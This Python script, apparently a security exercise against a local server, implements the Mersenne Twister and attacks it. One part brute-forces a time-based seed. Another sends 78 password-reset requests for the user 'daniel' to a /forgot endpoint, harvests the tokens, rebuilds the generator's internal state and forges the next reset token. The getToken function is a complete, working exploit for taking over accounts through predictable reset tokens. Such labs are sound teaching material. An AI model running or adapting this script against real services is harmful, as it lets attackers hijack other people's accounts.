import base64
import random
from time import sleep, time

import requests

from tqdm import tqdm


class MersenneTwist: 
  def __init__(self, seed: int):
    (self.w, self.n, self.m, self.r) = (32, 624, 397, 31)
    (self.a, self.u, self.d) = (0x9908B0DF, 11, 0xFFFFFFFF)
    (self.s, self.b) = (7, 0x9D2C5680)
    (self.t, self.c) = (15, 0xEFC60000)
    (self.l, self.f) = (18, 1812433253)

    self.MT = [0] * self.n
    self.index = self.n + 1
    self.lower_mask = (1 << self.r) - 1
    self.upper_mask = (~self.lower_mask) & 0xFFFFFFFF

    self.seed_mt(seed)
    #print("seed in init: {}".format(self.MT[0]))

  def seed_mt(self, seed: int):
    self.index = self.n
    self.MT[0] = seed
    for i in range(1, self.n):
      self.MT[i] = (self.f * (self.MT[i - 1] ^ (self.MT[i - 1] >> (self.w - 2))) + i) & 0xFFFFFFFF

    #print("seed in seed_mt: {}".format(self.MT[0]))


  # def unseed(self, foundMT):
  #   for i in range(self.n - 1, -1, -1):
  #     foundMT[i] = ((((foundMT[i + 1] ^ (foundMT[i + 1] >> (self.w + 2))) - i)) // self.f) & self.upper_mask
  #   return foundMT[0] #seed

  def extract_number(self):
    if self.index >= self.n:
      #print("here")
      if self.index > self.n:
        raise Exception("Generator was never seeded")
      self.twist()

    #print("index: {}".format(self.index))
    #print("seed: {}".format(self.MT[self.index]))
    y = self.MT[self.index]
    #print("y: {}".format(y))
    y = y ^ ((y >> self.u) & self.d)
    #print("y: {}".format(y))
    y = y ^ ((y << self.s) & self.b)
    #print("y: {}".format(y))
    y = y ^ ((y << self.t) & self.c)
    #print("y: {}".format(y))
    y = y ^ (y >> self.l)
    #print("y: {}".format(y))
    self.index += 1
    return y & 0xFFFFFFFF

  def mix(self, y):
    #print("y: {}".format(y))
    y = y ^ ((y >> self.u) & self.d)
    #print("y: {}".format(y))
    y = y ^ ((y << self.s) & self.b)
    #print("y: {}".format(y))
    y = y ^ ((y << self.t) & self.c)
    #print("y: {}".format(y))
    y = y ^ (y >> self.l)
    #print("y: {}".format(y))
    return y & 0xFFFFFFFF

  def twist(self):
    for i in range(self.n):
      x = (self.MT[i] & self.upper_mask) + (self.MT[(i + 1) % self.n] & self.lower_mask)
      xA = x >> 1
      if x % 2 != 0:
        xA = xA ^ self.a
      self.MT[i] = self.MT[(i + self.m) % self.n] ^ xA
    self.index = 0

  def ourTwist(self, foundMT):
    for i in range(self.n):
      x = (foundMT[i] & self.upper_mask) + (foundMT[(i + 1) % self.n] & self.lower_mask)
      xA = x >> 1
      if x % 2 != 0:
        xA = xA ^ self.a
      foundMT[i] = foundMT[(i + self.m) % self.n] ^ xA

    return foundMT
  
  def untwist(self, foundMT):
    for i in range(self.n - 1, -1, -1):
      foundMT[i] = self.unmix1(foundMT[i + 1]) ^ foundMT[(i + self.m) % self.n]
    return foundMT[0]

  def undoRightShift(self, val, shift):
    result = val
    for _ in range(32):
      result = val ^ (result >> shift)
    return result
    
  def undoLeftShift(self, val, shift, mask):
    result = val
    for _ in range(32):
      result = val ^ (result << shift & mask)
    return result


  def unmix2(self, token):
    #print("unmix end of y: {}".format(token))
    token = self.undoRightShift(token, self.l)
    #print("unmix xor with y >> 18: {}".format(token))
    token = self.undoLeftShift(token, self.t, self.c)
    #print("unmix xor with y << 15 & 0xEFC60000: {}".format(token))
    token = self.undoLeftShift(token, self.s, self.b)
    #print("unmix xor with y << 7 & 0x9D2C5680: {}".format(token))
    token = self.undoRightShift(token, self.u)
    #print("unmix xor with y >> 11: {}".format(token))

    return token
    
  
def oracle():
  print("oracle sleeping for 5-60 seconds")
  sleep(random.randint(5, 60))
  oracleTime = int(time())
  mt = MersenneTwist(oracleTime)
  print("oracle time: {}".format(oracleTime))
  print("oracle sleeping for 5-60 seconds")
  sleep(random.randint(5, 60))
  return base64.b64encode(bytes(mt.extract_number()))

def bruteForceOracle():
  oracleNum = oracle()
  currTime = int(time())
  print("brute force time: {}".format(currTime))
  for i in range(currTime - 120, currTime):
    mt = MersenneTwist(i)
    if base64.b64encode(bytes(mt.extract_number())) == oracleNum:
      return i
  return None

def getToken(): 
  url = 'http://localhost:8080/forgot'
  baseTokens = []
  tokens = []

  mt = MersenneTwist(1)

  for _ in range(78):
    x = requests.post(url, {"user": "daniel"})
    baseTokens.append(base64.b64decode(x.text.split("reset?token=")[1].split("<!--close_token-->")[0]).decode('utf-8')) 

  # # take each base token which is 8 tokens seperated by : and split them into 8 seperate tokens
  # # then add them to the tokens list  
  for baseToken in baseTokens: 
    for token in baseToken.split(":"):
      tokens.append(int(token))

  # for _ in range(624):
  #   tokens.append(mt.extract_number())

  # seedOutput = mt.extract_number()
  # print("seed output: {}".format(seedOutput))

  # print("tokens: {}".format(tokens))
  # print("len tokens: {}".format(len(tokens)))

  internalTokens = []

  for i in range(624):
    internalTokens.append(mt.unmix2(tokens[i]))

  ourTwisted = mt.ourTwist(internalTokens)

  # print("predicted value: {}".format(mt.mix(ourTwisted[0])))
  # print("actual value: {}".format(mt.extract_number()))

  # print("predicted value: {}".format(mt.mix(ourTwisted[1])))
  # print("actual value: {}".format(mt.extract_number()))

  # print("predicted value: {}".format(mt.mix(ourTwisted[2])))
  # print("actual value: {}".format(mt.extract_number()))

  resetToken = str(mt.mix(ourTwisted[0]))

  for i in range(1, 8):
    resetToken += ":" + str(mt.mix(ourTwisted[i]))

  print("reset token: {}".format(resetToken))

  resetToken = base64.b64encode(resetToken.encode('utf-8')).decode('utf-8')
  print("reset token: {}".format(resetToken))


  # ourSeed = mt.unmix2(seedOutput)
  # print("our seed: {}".format(ourSeed))

  # print("internal tokens: {}".format(internalTokens))
  # print("len internal tokens: {}".format(len(internalTokens)))

  # foundSeed = mt.unseed(internalTokens)

  # print("found seed: {}".format(foundSeed))

  # mixedTokens = mix(tokens)

  # print("mixed tokens: {}".format(mixedTokens))
  # print("len mixed tokens: {}".format(len(mixedTokens)))

  # predictedTokens = extractNumbers(mixedTokens)

  # print("predicted tokens: {}".format(predictedTokens))
  # print("len predicted tokens: {}".format(len(predictedTokens)))

  # newBaseTokens = []
  # newTokens = []

  # for _ in range(78):
  #   x = requests.post(url, {"user": "daniel"})
  #   newBaseTokens.append(base64.b64decode(x.text.split("reset?token=")[1].split("<!--close_token-->")[0]).decode('utf-8')) 

  # # take each base token which is 8 tokens seperated by : and split them into 8 seperate tokens
  # # then add them to the tokens list  
  # for baseToken in newBaseTokens: 
  #   for token in baseToken.split(":"):
  #     newTokens.append(int(token))

  # for _ in range(624):
  #   newTokens.append(mt.extract_number())
  
  # print("new tokens: {}".format(newTokens))
  # print("len new tokens: {}".format(len(newTokens)))

  # for i in range(len(newTokens)):
  #   print("=====================================")  
  #   print("new token: {}".format(newTokens[i]))
  #   print("predicted token: {}".format(predictedTokens[i]))
  #   if (newTokens[i] == predictedTokens[i]):
  #     print("token is the same")
  #   print("=====================================")


def mix(nums: list = None):
  n = 624
  r = 31
  m = 397
  a = 0x9908B0DF
  lower_mask = (1 << r) - 1
  upper_mask = (~lower_mask) & 0xFFFFFFFF

  for i in range(n):
    x = (nums[i] & upper_mask) + (nums[(i + 1) % n] & lower_mask)
    xA = x >> 1
    if x % 2 != 0:
      xA = xA ^ a
    nums[i] = nums[(i + m) % n] ^ xA

  return nums

def extractNumbers(nums: list = None):
  n = 624
  u = 11
  d = 0xFFFFFFFF
  s = 7
  b = 0x9D2C5680
  t = 15
  c = 0xEFC60000
  l = 18

  extractNums = []

  for i in range(n):
    y = nums[i]
    y = y ^ ((y >> u) & d)
    y = y ^ ((y << s) & b)
    y = y ^ ((y << t) & c)
    y = y ^ (y >> l)
    extractNums.append(y & 0xFFFFFFFF)
  
  return extractNums

def main():
  # mt = MersenneTwist(0)
  # for _ in range(10):
  #   print(mt.extract_number())

  # print(bruteForceOracle())

  getToken()

  # def extract_number(self):
  #   if self.index >= self.n:
  #     if self.index > self.n:
  #       raise Exception("Generator was never seeded")
  #     self.twist()

  #   y = self.MT[self.index]
  #   y = y ^ ((y >> 11) & 0xFFFFFFFF)
  #   y = y ^ ((y << 7) & 0x9D2C5680)
  #   y = y ^ ((y << 15) & 0xEFC60000)
  #   y = y ^ (y >> 18)
  #   self.index += 1
  #   return y & 0xFFFFFFFF
  
main()
